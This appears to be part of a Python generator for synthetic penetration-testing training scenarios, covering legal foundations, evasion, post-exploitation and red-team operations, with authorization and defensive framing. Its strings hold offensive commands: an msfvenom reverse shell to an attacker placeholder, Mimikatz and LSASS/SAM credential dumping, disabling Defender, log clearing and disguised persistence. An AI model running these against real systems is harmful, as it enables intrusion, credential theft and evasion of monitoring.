        difficulty=difficulty,
        target_platform="various",
        mitre_attack_ids=["TA0043"],  # Reconnaissance (tactic, not technique - foundations)
        owasp_category=None,  # Methodology, not vulnerability-specific
        tools_required=["MITRE ATT&CK Navigator", "OWASP Testing Guide", "Documentation tools"],
        tools_descriptions={
            "MITRE ATT&CK Navigator": "Web-based tool for visualizing and annotating ATT&CK matrices. Essential for threat modeling and planning security assessments. Create layers to map adversary techniques to defensive controls.",
            "OWASP Testing Guide": "Comprehensive manual for web application security testing methodology (v4.0+). Covers testing checklist, techniques, and tools. Reference: https://owasp.org/www-project-web-security-testing-guide/",
            "Documentation tools": "Essential for professional reporting: Markdown editors, screenshot tools (Flameshot, Greenshot), report templates (Offensive Security, PTES), vulnerability databases (CVE, CWE, CAPEC)"
        },
        context=f"You are establishing security assessment framework for {topic}. This requires understanding legal boundaries, ethical considerations, and professional methodology. All work must be within authorized scope and follow industry standards.",
        objective=f"Develop comprehensive understanding of {topic} including legal requirements, methodology frameworks (PTES, OWASP, NIST), and professional practices for security assessments.",
        steps=[
            f"1. Review legal and regulatory requirements for {topic}",
            "2. Obtain written authorization defining scope, timeline, and constraints",
            "3. Understand Rules of Engagement (RoE): targets, methods, schedule, contacts",
            "4. Select appropriate methodology: PTES, OWASP, NIST SP 800-115, OSSTMM",
            "5. Define assessment phases: planning, reconnaissance, scanning, exploitation, post-exploit, reporting",
            "6. Map assessment to MITRE ATT&CK tactics and techniques",
            "7. Prepare documentation templates: finding reports, executive summaries, technical details",
            "8. Establish communication plan with client/stakeholders",
            "9. Set up secure infrastructure: VPN, documentation repositories, evidence handling",
            "10. Review and document any ethical considerations or safety constraints"
        ],
        explanation=f"""**Security Foundations: {topic}**

**Legal and Authorization Framework:**
Security testing without authorization is ILLEGAL in most jurisdictions:
- **Computer Fraud and Abuse Act (CFAA)**: US federal law prohibiting unauthorized access
- **GDPR**: Data protection requirements in EU, affects security testing
- **PCI DSS**: Specific requirements for payment card data security assessments
- **HIPAA**: Healthcare data protection requirements
- **SOX**: Financial reporting security requirements

**Required Authorization:**
1. **Written Contract/Engagement Letter**: Defines scope, timeline, payment, liability
2. **Rules of Engagement (RoE)**: Detailed scope document
   - In-scope targets (IPs, domains, applications)
   - Out-of-scope systems (production databases, third-party services)
   - Allowed techniques (social engineering, DoS, exploitation)
   - Time windows (business hours only, maintenance windows)
   - Emergency contacts and escalation procedures
3. **Legal Review**: Ensure compliance with all applicable laws
4. **Insurance**: Professional liability and cyber insurance

**Professional Methodologies:**
1. **PTES (Penetration Testing Execution Standard)**
   - Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post Exploitation, Reporting
   - Industry standard for penetration testing

2. **OWASP Testing Guide**
   - Web application security testing methodology
   - 4.0+ version with modern techniques
   - Covers authentication, session management, input validation, etc.

3. **NIST SP 800-115**
   - Technical Guide to Information Security Testing and Assessment
   - Government standard, widely adopted

4. **OSSTMM (Open Source Security Testing Methodology Manual)**
   - Comprehensive security testing methodology
   - Operational security metrics

**MITRE ATT&CK Framework:**
- **14 Tactics**: Reconnaissance -> Impact (attack lifecycle)
- **191+ Techniques**: Specific attack methods
- **400+ Sub-techniques**: Variants and specific implementations
- Use for: Threat modeling, gap analysis, defensive planning

**OWASP Top 10:**
- **Web Application**: A01 (Broken Access Control) -> A10 (SSRF)
- **API Security**: API1 (Broken Object Level Authorization) -> API10
- **Mobile**: M1 (Improper Platform Usage) -> M10

**Ethical Considerations:**
- **Confidentiality**: Never disclose client information or findings publicly without permission
- **Integrity**: Report all findings accurately, including false positives
- **Availability**: Minimize impact on production systems
- **Responsible Disclosure**: 90-day disclosure timeline for vulnerabilities
- **Data Handling**: Secure storage and destruction of client data
- **Conflict of Interest**: Disclose any conflicts

**Professional Certifications:**
- **OSCP** (Offensive Security Certified Professional): Hands-on pentesting
- **OSCE** (Offensive Security Certified Expert): Advanced exploitation
- **CEH** (Certified Ethical Hacker): Foundational security knowledge
- **GPEN** (GIAC Penetration Tester): SANS certification
- **CREST**: UK-based penetration testing certifications""",
        common_mistakes=[
            "Beginning assessment without written authorization",
            "Exceeding defined scope (testing out-of-scope systems)",
            "Not documenting methodology and timeline",
            "Failing to communicate with client during assessment",
            "Not having emergency rollback procedures",
            "Inadequate evidence preservation (screenshots, logs, commands)",
            "Poor report writing - too technical or not technical enough",
            "Disclosing vulnerabilities before client has patched",
            "Not considering business impact of findings",
            "Ignoring compliance requirements (PCI, HIPAA, etc.)"
        ],
        defensive_countermeasures=[
            "Establish formal security assessment program",
            "Define clear authorization and approval processes",
            "Create standardized RoE templates",
            "Maintain vulnerability management program",
            "Implement coordinated disclosure process",
            "Conduct regular security awareness training",
            "Use threat modeling to prioritize security testing",
            "Integrate security into SDLC (DevSecOps)",
            "Maintain relationships with security researchers",
            "Have incident response plan for findings during assessments",
            "Budget for remediation of discovered vulnerabilities"
        ]
    )


def _generate_evasion_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate evasion/obfuscation scenario (WAF/AV/EDR bypass)"""

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
        difficulty=difficulty,
        target_platform="various",
        mitre_attack_ids=["T1027", "T1140", "T1055", "T1562"],  # Obfuscation, Deobfuscation, Process Injection, Impair Defenses
        owasp_category=None,  # Evasion is a technique, not a vulnerability
        tools_required=["msfvenom", "encoders/obfuscators", "WAFNinja", "DefenderCheck"],
        tools_descriptions={
            "msfvenom": "Metasploit payload generator with encoding capabilities. Generate payloads with encoders (shikata_ga_nai, xor) and formats. Usage: msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ATTACKER_IP} -e x86/shikata_ga_nai -i 10 -f exe",
            "encoders/obfuscators": "Tools for payload obfuscation: Veil-Evasion (AV bypass), Invoke-Obfuscation (PowerShell), Chimera (shellcode), ConfuserEx (.NET). Each targets different detection mechanisms.",
            "WAFNinja": "Web Application Firewall bypass tool using fuzzing and encoding techniques. Tests common WAF evasion methods: comment injection, Unicode encoding, case manipulation. Usage: wafw00f ${TARGET_URL} (detect WAF), wafninja bypass -u ${TARGET_URL}",
            "DefenderCheck": "Tool for identifying Windows Defender signatures in payloads. Identifies which bytes trigger detection, enabling targeted obfuscation. Essential for AV evasion testing."
        },
        context=f"You have authorization to test security controls for {topic}, specifically evaluating detection and prevention capabilities of WAF/AV/EDR/IDS/IPS. Purpose is to identify gaps in security controls to improve defensive posture.",
        objective=f"Evaluate security control effectiveness for {topic} by testing evasion techniques. Goal is to identify detection gaps and improve defensive controls, not to bypass for malicious purposes.",
        steps=[
            f"1. Identify security controls protecting {topic} (WAF, AV, EDR, IDS/IPS)",
            "2. Fingerprint security product (vendor, version, ruleset)",
            "3. Research known bypass techniques for identified product",
            "4. Baseline test: Send known malicious payload to trigger detection",
            "5. Apply encoding/obfuscation techniques appropriate to control type",
            "6. Test evasion effectiveness while maintaining payload functionality",
            "7. Document successful bypass methods and detection gaps",
            "8. Recommend defensive improvements: signature updates, behavior analysis, layered controls",
            "9. Test recommended mitigations to validate effectiveness",
            "10. Report findings with both offensive techniques and defensive recommendations"
        ],
        explanation=f"""**Security Control Evasion: {topic}**

**Authorization Context:**
Testing evasion techniques requires explicit authorization. Purpose must be defensive: identifying gaps to improve security controls. Never use evasion techniques to bypass security controls for unauthorized access or malicious purposes.

**Types of Security Controls:**
1. **WAF (Web Application Firewall)**: Cloudflare, ModSecurity, AWS WAF, Imperva
   - Signature-based: Regex patterns for attack payloads
   - Anomaly-based: Statistical analysis of traffic
   - Bypass methods: Encoding, comment injection, case manipulation, chunked encoding

2. **AV (Antivirus)**: Windows Defender, Symantec, McAfee, ClamAV
   - Signature-based: Hash and byte pattern matching
   - Heuristic: Behavioral analysis of suspicious actions
   - Bypass methods: Payload obfuscation, encryption, polymorphism, packing

3. **EDR (Endpoint Detection & Response)**: CrowdStrike, SentinelOne, Carbon Black
   - Behavioral analysis: Process chains, API calls, network connections
   - ML/AI: Anomaly detection based on training data
   - Bypass methods: Living-off-the-land (LOLBins), process injection, memory-only execution

4. **IDS/IPS (Intrusion Detection/Prevention)**: Snort, Suricata, Cisco Firepower
   - Network-based: Packet inspection and protocol analysis
   - Host-based: System call monitoring and log analysis
   - Bypass methods: Fragmentation, protocol abuse, encryption

**WAF Evasion Techniques:**
1. **Case Manipulation**: `<ScRiPt>alert(1)</ScRiPt>`
2. **Comment Injection**: `uni/**/on sel/**/ect` (SQL), `<scr<!--comment-->ipt>` (XSS)
3. **Encoding**: URL encoding (%27), Unicode (\\u0027), HTML entities (&apos;)
4. **Alternative Syntax**: `concat('ad','min')` vs `'ad'+'min'` (SQL dialects)
5. **HTTP Parameter Pollution**: Split parameters across multiple headers
6. **Chunked Encoding**: Transfer-Encoding: chunked to bypass inspection
7. **Content-Type Tricks**: Send JSON when expecting form data

**AV Evasion Techniques:**
1. **Encoding**: Shikata Ga Nai, XOR, Base64 + decoding stub
2. **Encryption**: AES encrypt payload, decrypt at runtime
3. **Polymorphism**: Self-modifying code that changes on each execution
4. **Obfuscation**: String splitting, variable renaming, junk code insertion
5. **Packing**: UPX, Themida, custom packers
6. **Process Injection**: Inject into legitimate process (explorer.exe, svchost.exe)
7. **Reflective Loading**: Load DLL from memory without touching disk
8. **Amsi Bypass**: Disable PowerShell's AMSI (Antimalware Scan Interface)

**EDR Evasion Techniques:**
1. **Living-off-the-Land**: Use built-in tools (PowerShell, wmic, certutil)
2. **Parent Process Spoofing**: Make malicious process appear to spawn from legitimate parent
3. **API Unhooking**: Remove EDR hooks from monitored API functions
4. **Direct Syscalls**: Bypass user-mode hooks by calling kernel directly
5. **Memory-only Execution**: Never write to disk (fileless malware)
6. **DLL Sideloading**: Load malicious DLL via legitimate application
7. **Timing Evasion**: Sleep/delay to avoid sandbox analysis

**Ethical Considerations:**
Testing evasion techniques requires careful control:
- **Authorized environment only**: Test on controlled systems with permission
- **Defensive purpose**: Goal is improving security controls, not bypassing them maliciously
- **Responsible disclosure**: Report bypass techniques to security vendors
- **Controlled payloads**: Use proof-of-concept payloads, not weaponized malware
- **Documentation**: Provide defensive recommendations with offensive findings

**Detection Improvements:**
After identifying evasion techniques, recommend:
- Multi-layered defense (WAF + IPS + EDR)
- Behavioral analysis in addition to signatures
- Machine learning for anomaly detection
- Regular signature and ruleset updates
- Threat intelligence integration
- Application whitelisting
- Privileged access management
- Network segmentation to limit lateral movement""",
        common_mistakes=[
            "Using evasion without authorization for testing security controls",
            "Focusing only on bypassing without recommending defensive improvements",
            "Breaking payload functionality while obfuscating",
            "Not testing in isolated environment first (triggering production alerts)",
            "Using known malicious hashes (VirusTotal submissions)",
            "Forgetting that multi-layered defenses require multiple evasions",
            "Not considering legitimate security logging and monitoring",
            "Disclosing bypass techniques publicly without vendor coordination"
        ],
        defensive_countermeasures=[
            "Implement defense-in-depth: Multiple overlapping security controls",
            "Use behavioral analysis, not just signatures (EDR, SIEM)",
            "Enable application whitelisting (AppLocker, WDAC)",
            "Monitor for suspicious process behaviors (parent-child relationships)",
            "Implement PowerShell logging (script block, transcription)",
            "Use managed detection and response (MDR) services",
            "Regular security control testing (Purple Team exercises)",
            "Keep security products updated with latest signatures/rules",
            "Deploy deception technology (honeypots, canary tokens)",
            "Network segmentation to limit blast radius",
            "Privileged access management and least privilege",
            "Security awareness training on social engineering"
        ]
    )


def _generate_postexploit_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate post-exploitation scenario (persistence, lateral movement, exfiltration)"""

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
        difficulty=difficulty,
        target_platform="windows" if "windows" in topic.lower() else "linux",
        mitre_attack_ids=["T1053", "T1021", "T1041", "T1003", "T1547"],  # Scheduled Task, Remote Services, Exfiltration, Credential Dumping, Boot/Logon Autostart
        owasp_category=None,  # Post-exploit, not vulnerability-specific
        tools_required=["Mimikatz", "BloodHound", "CrackMapExec", "Empire/Covenant"],
        tools_descriptions={
            "Mimikatz": "Windows credential extraction tool. Dumps plaintext passwords, hashes, PINs, and Kerberos tickets from memory. Usage: mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords'. CRITICAL: Only use with authorization on owned systems.",
            "BloodHound": "Active Directory reconnaissance tool using graph theory. Maps AD relationships, trust paths, and privilege escalation opportunities. Usage: Run SharpHound collector, import to BloodHound GUI, analyze 'Shortest Paths to Domain Admins'.",
            "CrackMapExec": "Swiss army knife for pentesting networks. Supports SMB, LDAP, MSSQL, WinRM, SSH. Credential spraying, command execution, credential dumping. Usage: crackmapexec smb ${TARGET_NETWORK}/24 -u ${USER} -p ${PASSWORD} --shares",
            "Empire/Covenant": "Post-exploitation C2 frameworks. Agent-based control of compromised systems with modules for persistence, lateral movement, credential theft. Empire (Python-based), Covenant (C#/.NET-based)."
        },
        context=f"You have gained authorized access to system for {topic} as part of approved red team engagement. Assessment requires demonstrating post-exploitation impact to validate security controls and incident response capabilities. All activities logged and coordinated with blue team.",
        objective=f"Demonstrate post-exploitation capabilities for {topic} including persistence establishment, privilege maintenance, lateral movement, and data access. Goal is validating detection controls and incident response, not causing damage.",
        steps=[
            f"1. Establish stable access after initial compromise for {topic}",
            "2. Perform local enumeration: users, groups, processes, services, scheduled tasks",
            "3. Attempt privilege escalation if not already SYSTEM/root",
            "4. Establish persistence mechanism (scheduled task, registry key, service)",
            "5. Dump credentials from memory (LSASS), registry (SAM), or files",
            "6. Enumerate network: domain controllers, file shares, databases, other systems",
            "7. Perform lateral movement to high-value targets using harvested credentials",
            "8. Access sensitive data on file shares, databases, or user directories",
            "9. Establish C2 beacon for long-term access (if scope permits)",
            "10. Document attack path, accessed data, and dwell time before blue team detection"
        ],
        explanation=f"""**Post-Exploitation Operations: {topic}**

**Authorization Context:**
Post-exploitation activities require explicit authorization as part of red team engagement. Scope must clearly define:
- Systems authorized for post-exploitation
- Data that can be accessed (avoid regulated data: PHI, PCI, classified)
- Allowed persistence mechanisms
- Lateral movement boundaries
- Notification requirements before accessing production systems

**Post-Exploitation Objectives:**
1. **Maintain Access**: Survive reboots, credential changes, AV scans
2. **Escalate Privileges**: SYSTEM/root access for maximum control
3. **Internal Reconnaissance**: Understand environment and identify targets
4. **Lateral Movement**: Spread to additional systems and domains
5. **Data Access**: Demonstrate impact by accessing sensitive information
6. **Avoid Detection**: Evade EDR, SIEM, and SOC analysts
7. **Document Impact**: Prove business risk to justify security investments

**Credential Harvesting:**
1. **LSASS Dumping**: Extract credentials from memory
   - Mimikatz: `sekurlsa::logonpasswords`
   - Procdump: `procdump.exe -ma lsass.exe lsass.dmp`
   - Task Manager: Right-click lsass.exe -> Create dump file

2. **SAM/SYSTEM Registry**: Offline password hash extraction
   - `reg save HKLM\\SAM sam.hiv`
   - `reg save HKLM\\SYSTEM system.hiv`
   - Extract with samdump2 or secretsdump

3. **NTDS.dit**: Active Directory database with all domain credentials
   - DCSync attack: `mimikatz 'lsadump::dcsync /domain:${DOMAIN} /all'`
   - Volume Shadow Copy: `vssadmin create shadow /for=C:`

4. **Application Credentials**: Browser passwords, WiFi keys, application configs
   - LaZagne: All-in-one credential recovery tool
   - Browser SQLite databases (Chromium: Login Data)

**Persistence Mechanisms:**
1. **Registry Run Keys**: `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`
2. **Scheduled Tasks**: `schtasks /create /tn "Windows Update" /tr ${PAYLOAD} /sc onlogon`
3. **Services**: `sc create ${SERVICE_NAME} binPath= ${PAYLOAD_PATH} start= auto`
4. **WMI Event Subscriptions**: Fileless persistence via WMI
5. **Startup Folder**: `%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`
6. **DLL Hijacking**: Replace legitimate DLL with malicious version
7. **Golden Ticket**: Kerberos TGT with 10-year lifetime (requires krbtgt hash)

**Lateral Movement Techniques:**
1. **Pass-the-Hash**: Authenticate using NTLM hash instead of password
   - `crackmapexec smb ${TARGET_IP} -u ${USER} -H ${NTLM_HASH}`

2. **Pass-the-Ticket**: Kerberos ticket reuse for authentication
   - Export ticket with Mimikatz, import on attacker system

3. **PSExec**: Remote command execution via SMB (ADMIN$ share)
   - `psexec.exe \\\\${TARGET_IP} -u ${DOMAIN}\\${USER} -p ${PASSWORD} cmd.exe`

4. **WinRM/PowerShell Remoting**: Remote management if enabled
   - `Enter-PSSession -ComputerName ${TARGET_IP} -Credential ${CREDS}`

5. **WMI**: Remote execution via Windows Management Instrumentation
   - `wmic /node:${TARGET_IP} /user:${USER} process call create "${COMMAND}"`

6. **RDP**: Remote desktop access (requires GUI interaction)

7. **SMB Relay**: Relay authentication to other systems without credentials

**Data Exfiltration:**
1. **SMB/FTP**: Transfer files to attacker-controlled server
2. **HTTP POST**: Upload data via web requests (blends with normal traffic)
3. **DNS Tunneling**: Encode data in DNS queries (slow but stealthy)
4. **Cloud Storage**: Upload to Dropbox/OneDrive (looks like normal activity)
5. **Email**: Send data as attachments (may trigger DLP)
6. **Steganography**: Hide data in images (advanced evasion)

**Detection Evasion:**
- Disable Windows Defender: `Set-MpPreference -DisableRealtimeMonitoring $true`
- Clear event logs: `wevtutil cl Security` (suspicious!)
- Timestomping: Modify file timestamps to appear legitimate
- Process injection: Hide in legitimate processes (explorer.exe)
- Obfuscate payloads: Encode/encrypt binaries and scripts
- Use living-off-the-land binaries: PowerShell, wmic, certutil (already trusted)

**Ethical Boundaries:**
- Do NOT access personal data, regulated data (PHI/PII/PCI), or classified information
- Do NOT cause damage, delete files, or disrupt operations
- Do NOT exfiltrate real sensitive data (use test files)
- DO coordinate with blue team and legal/compliance
- DO maintain detailed logs of all activities
- DO follow coordinated disclosure timeline""",
        common_mistakes=[
            "Not establishing persistence before losing initial access",
            "Using loud techniques that trigger SOC alerts (psexec, net commands)",
            "Accessing regulated data (HIPAA, PCI) during testing",
            "Deleting logs or covering tracks (makes incident response training impossible)",
            "Lateral movement without coordination (hitting production systems)",
            "Not documenting attack path (can't reproduce findings)",
            "Forgetting to clean up persistence mechanisms after assessment",
            "Using personal attacker infrastructure (not OpSec safe)"
        ],
        defensive_countermeasures=[
            "Implement credential guard and Protected Process Light (PPL)",
            "Enable LSA Protection to prevent LSASS dumping",
            "Use LAPS (Local Admin Password Solution) for unique local admin passwords",
            "Disable NTLM and use Kerberos only (when possible)",
            "Implement privileged access workstations (PAWs) for admins",
            "Enable PowerShell logging and monitoring (ScriptBlock, Transcription)",
            "Deploy EDR with behavioral detection (not just signatures)",
            "Use honeytokens and honeypots to detect lateral movement",
            "Implement network segmentation to limit lateral movement",
            "Monitor for abnormal authentication patterns (impossible travel, etc.)",
            "Regular credential rotation and password policies",
            "Application whitelisting to prevent unauthorized executables"
        ]
    )


def _generate_advanced_scenario(self, scenario_id: str, category: str, topic: str, difficulty: str) -> SecurityScenario:
    """Generate advanced scenario (resource development, collection, impact)"""

    return SecurityScenario(
        scenario_id=scenario_id,
        category=category,
        difficulty=difficulty,
        target_platform="various",
        mitre_attack_ids=["T1583", "T1588", "T1566", "T1595", "T1592", "T1594"],  # Acquire Infrastructure, Obtain Capabilities, Phishing, Active Scanning, Gather Victim Org Info, Search Victim-Owned Websites
        owasp_category=None,  # Advanced tactics, not vulnerability-specific
        tools_required=["SET (Social Engineering Toolkit)", "Cobalt Strike", "GoPhish", "OSINT tools"],
        tools_descriptions={
            "SET (Social Engineering Toolkit)": "Python-driven social engineering framework. Create phishing campaigns, credential harvesters, malicious payloads. Usage: setoolkit -> 1) Social-Engineering Attacks -> 2) Website Attack Vectors. CRITICAL: Only use with authorization.",
            "Cobalt Strike": "Commercial adversary simulation and red team operations platform. C2 framework with malleable profiles, beacon implants, and post-exploitation modules. Professional pentesting tool requiring license. NOT FOR UNAUTHORIZED USE.",
            "GoPhish": "Open-source phishing framework for creating and managing campaigns. Email templates, landing pages, campaign metrics, user training. Usage: Set up SMTP, create campaign, send phishing emails. Authorization required.",
            "OSINT tools": "theHarvester (email/subdomain enumeration), Shodan (internet-connected device search), Maltego (relationship graphing), SpiderFoot (automated OSINT). Essential for reconnaissance phase."
        },
        context=f"You are conducting advanced adversary simulation for {topic} as part of comprehensive red team engagement. This includes resource development, reconnaissance, initial access, and full attack chain. Operations coordinated with client leadership and security team with explicit authorization.",
        objective=f"Execute full-spectrum adversary simulation for {topic} including infrastructure setup, intelligence gathering, social engineering, initial access, and demonstrating business impact. Goal is realistic threat simulation to test detection and response capabilities.",
        steps=[
            f"1. Establish operational infrastructure for {topic}: C2 servers, phishing domains, email servers",
            "2. Conduct extensive OSINT: employees, org structure, technologies, relationships",
            "3. Develop custom payloads and tools tailored to target environment",
            "4. Create social engineering pretext based on organizational research",
            "5. Execute initial access via phishing, compromised credentials, or external vulnerabilities",
            "6. Establish C2 communication and avoid detection by security controls",
            "7. Perform post-exploitation: persistence, privilege escalation, lateral movement",
            "8. Access high-value targets and sensitive data demonstrating business impact",
            "9. Maintain access while documenting blue team detection timeline",
            "10. Provide comprehensive report with attack chain, findings, and recommendations"
        ],
        explanation=f"""**Advanced Adversary Simulation: {topic}**

**Authorization Context:**
Advanced red team operations require executive-level authorization due to their realistic nature and potential business impact:
- **Legal Review**: Ensure compliance with all laws and regulations
- **Insurance**: Verify cyber insurance covers authorized adversary simulation
- **Scope Definition**: Clear boundaries on systems, data, and techniques
- **Coordination**: Blue team may be unaware (testing detection) or coordinated (purple team)
- **Emergency Procedures**: Defined process for stopping operations if needed
- **Data Protection**: Do not access/exfiltrate regulated data (PHI, PCI, classified)

**MITRE ATT&CK Advanced Tactics:**

**1. Resource Development (TA0042)**
- **Acquire Infrastructure (T1583)**: VPS, domains, CDN, email servers
  - Use cloud providers (AWS, Azure, DigitalOcean) with disposable accounts
  - Register domains similar to target (typosquatting for phishing)
  - Set up C2 infrastructure with domain fronting or encrypted channels

- **Obtain Capabilities (T1588)**: Tools, exploits, certificates, malware
  - Develop custom payloads to avoid signature detection
  - Obtain code-signing certificates for payload legitimacy
  - Purchase or develop exploits for target environment

- **Develop Capabilities (T1587)**: Custom tools, exploits, payloads
  - Weaponize exploits for target OS and applications
  - Create custom C2 protocols and encryption
  - Develop social engineering pretexts and phishing templates

**2. Reconnaissance (TA0043)**
- **Active Scanning (T1595)**: Network scanning, vulnerability scanning
  - External: nmap, masscan for exposed services
  - Internal (after access): Network mapping, service enumeration

- **Gather Victim Information (T1589-T1594)**:
  - Employee information: LinkedIn, social media, data breaches
  - Org information: Technologies used, business relationships, locations
  - Network information: Domains, IPs, ASNs, mail servers, DNS records
  - Technical information: Job postings reveal technologies (we use AWS, React, etc.)

**3. Initial Access (TA0001)**
- **Phishing (T1566)**: Spearphishing, attachments, links
  - Targeted emails based on OSINT research
  - Malicious attachments (macros, executables, LNK files)
  - Credential harvesting via fake login pages

- **Valid Accounts (T1078)**: Compromised or default credentials
  - Credential stuffing with leaked password databases
  - Default credentials on exposed services
  - Brute force against weak accounts

- **Exploit Public-Facing Application (T1190)**
  - External web apps, VPN, email, Citrix, etc.
  - 0-day or N-day exploits for target software
  - Web shells and backdoors

**Social Engineering Tactics:**
1. **Pretexting**: Create believable scenario (IT support, vendor, executive assistant)
2. **Phishing Types**:
   - Spear Phishing: Targeted emails to specific individuals
   - Whaling: Target executives/high-value individuals
   - Vishing: Voice phishing (phone calls)
   - Smishing: SMS phishing
   - Quishing: QR code phishing

3. **Psychological Principles**:
   - Authority: Impersonate executives or authorities
   - Urgency: "Account suspended", "Urgent action required"
   - Scarcity: "Limited time offer", "Only you qualify"
   - Social Proof: "Everyone else has completed this"
   - Likeness: Build rapport before asking

4. **Execution**:
   - Research target thoroughly (LinkedIn, social media, company website)
   - Craft believable email from/to addresses
   - Use legitimate-looking domains (companyname-portal.com)
   - Include relevant details (project names, org structure)
   - Test emails against spam filters before campaign

**C2 Infrastructure:**
- **Redirectors**: Protect actual C2 servers behind proxies/redirectors
- **Domain Fronting**: Hide C2 in legitimate CDN traffic (CloudFlare, Azure CDN)
- **DNS Tunneling**: C2 over DNS queries (slow but covert)
- **HTTPS C2**: Encrypted traffic blends with normal web traffic
- **Malleable Profiles**: Cobalt Strike profiles mimicking legitimate traffic
- **Fast Flux**: Rapidly change DNS records to avoid blocking

**Impact Demonstration (TA0040):**
For red team assessments, demonstrate potential impact WITHOUT causing actual damage:
- **Data Destruction**: Show ability to delete/encrypt data (don't actually do it)
- **Defacement**: Demonstrate web server access (test on staging)
- **DoS**: Show potential for disruption (don't execute)
- **Data Exfiltration**: Prove access to sensitive data (use test files only)
- **Ransomware Simulation**: Demonstrate encryption capability (test systems only)

**Red Team vs Penetration Testing:**
- **Pentest**: Technical vulnerability assessment, known to client, comprehensive coverage
- **Red Team**: Adversary simulation, may be unknown to defenders, realistic attack scenarios
- **Purple Team**: Collaborative red/blue to improve detection and response

**Professional Ethics:**
Red team operations must balance realism with responsibility:
- Never cause actual business disruption or data loss
- Avoid accessing truly sensitive data (use test data)
- Stop operations immediately if unintended consequences occur
- Coordinate with legal and executive leadership
- Provide actionable defensive recommendations
- Respect boundaries: no attacks on personal accounts unless explicitly authorized""",
        common_mistakes=[
            "Using attacker-owned infrastructure without proper OpSec",
            "Sending phishing emails without spam filter testing (triggers immediate alert)",
            "Not maintaining operational security (exposing real identity/location)",
            "Causing actual business disruption during adversary simulation",
            "Accessing regulated data (HIPAA, PCI) during engagement",
            "Not documenting attack timeline and techniques used",
            "Failing to coordinate scope changes with client",
            "Using malicious tools without testing in lab environment first",
            "Not having emergency stop procedures defined",
            "Burning infrastructure by triggering IP/domain blacklists"
        ],
        defensive_countermeasures=[
            "Security awareness training with simulated phishing campaigns",
            "Email security: SPF, DKIM, DMARC, sandbox attachments",
            "Deploy EDR and XDR with threat intelligence integration",
            "Network segmentation to limit lateral movement",
            "Monitor for C2 traffic patterns and beaconing",
            "Implement zero trust architecture (verify everything)",
            "Use deception technology (honeypots, honeytokens)",
            "Threat intelligence integration (known C2 IPs, domains)",
            "Regular red team exercises to test detection capabilities",
            "Incident response plan with defined procedures and contacts",
            "Employee reporting mechanism for suspicious activity",
            "Privileged access management and just-in-time access"
        ]
    )


# All templates complete! Ready for integration.
